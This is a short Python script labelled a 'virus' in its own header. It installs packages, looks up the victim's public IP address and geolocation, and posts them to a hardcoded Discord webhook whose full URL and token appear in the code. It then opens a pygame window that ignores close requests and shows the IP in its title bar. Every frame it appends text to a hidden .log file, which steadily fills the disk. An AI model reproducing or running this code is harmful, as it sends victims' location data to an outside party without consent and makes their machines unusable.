# virus using pygame to stay open

# setup
import os
os.system('pip install pygame discord.webhook')
clear = lambda: os.system('clear')
clear()
import pygame
pygame.init()
win = pygame.display.set_mode((500, 500))
x = 50
y = 50
width = 40
height = 60
from urllib.request import Request, urlopen
# name = os.system('USERNAME')   windows only
ipaddress = urlopen(Request('https://api.ipify.org/')).read().decode()
locinfo = urlopen(Request('https://ipinfo.io/json/')).read().decode()
from discord_webhook import DiscordWebhook, DiscordEmbed
content  = locinfo
webhook = DiscordWebhook(url='https://ptb.discord.com/api/webhooks/938909023854534756/lETr2-1auh8HJQCgdFWu19L_gagWidyRnf4pCMzIqKuyvaqxCHcd_pAcHqwX3A66x_we', username='Logs',content=content)
embed = DiscordEmbed(title='Unlucky day for *someone*.', color=242424)
webhook.add_embed(embed)
webhook.execute()


# trollin'
pygame.display.set_caption(ipaddress)

# loop
run = True
while run:
    pygame.time.delay(1)

    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            run = True

    pygame.draw.rect(win, (255, 0, 0), (x, y, width, height))
    pygame.display.update()
    f = open('.log', 'a')
    f.write('FORTNITE BAD MINECRAFT GOOD\n')
    f.close()
run = True
